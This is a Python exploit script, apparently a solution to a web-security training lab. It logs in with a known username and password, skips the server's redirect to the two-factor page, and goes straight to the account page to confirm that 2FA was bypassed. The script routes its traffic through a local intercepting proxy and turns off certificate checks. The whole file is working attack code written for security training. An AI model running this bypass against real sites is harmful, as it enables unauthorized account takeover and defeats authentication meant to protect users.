import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def access_carlos_account(s, url):
    # login to Carlos' account
    print("[+] Logging into Carlos' account and bypassing 2FA verification...")
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "montoya"}
    r = s.post(login_url, verify=False, proxies=proxies, data=login_data, allow_redirects=False)
    # when logging in, the app auto-redirects the user to the endpoint /login2 for 2FA verification
    # by having allow_redirects=False, we drop the 2FA page and go right to the my-account page

    # confirm bypass
    myaccount_url = url + "/my-account"
    r = s.get(myaccount_url, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print("[+] Successfully bypassed 2FA verification.")
    else:
        print("[-] Exploit failed.")
        exit(-1)

def main():
    # verify script parameters
    if len(sys.argv) != 2:
        print('[+] Usage: %s "<url>"' % sys.argv[0])
        print('[+] Example: %s "www.example.com"' % sys.argv[0])
        exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    access_carlos_account(s, url)

if __name__ == "__main__":
    main()